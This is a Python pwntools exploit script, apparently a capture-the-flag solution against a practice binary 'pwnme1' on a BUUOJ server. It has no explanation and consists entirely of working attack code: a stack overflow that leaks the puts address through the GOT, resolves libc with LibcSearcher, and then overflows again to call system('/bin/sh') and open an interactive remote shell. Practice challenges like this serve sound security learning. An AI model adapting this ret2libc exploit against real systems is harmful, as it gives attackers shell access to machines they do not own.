#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/23 09:24:03
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('pwnme1')
else:
    sh = remote("node3.buuoj.cn",25535)
elf = ELF('pwnme1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x080486F4
# libc = ELF()
sh.recvuntil(">> 6. Exit    \n")
sh.sendline("5")
payload = "a" * 0xa4 + 'aaaa' + p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.sendline(payload)
puts_addr = u32(sh.recvuntil("\xf7")[-4:])
log.info("success leak puts_addr:0x%x"%puts_addr)
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
sh.recvuntil(">> 6. Exit    \n")
sh.sendline("5")
payload = "a" * 0xa4 + 'aaaa' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()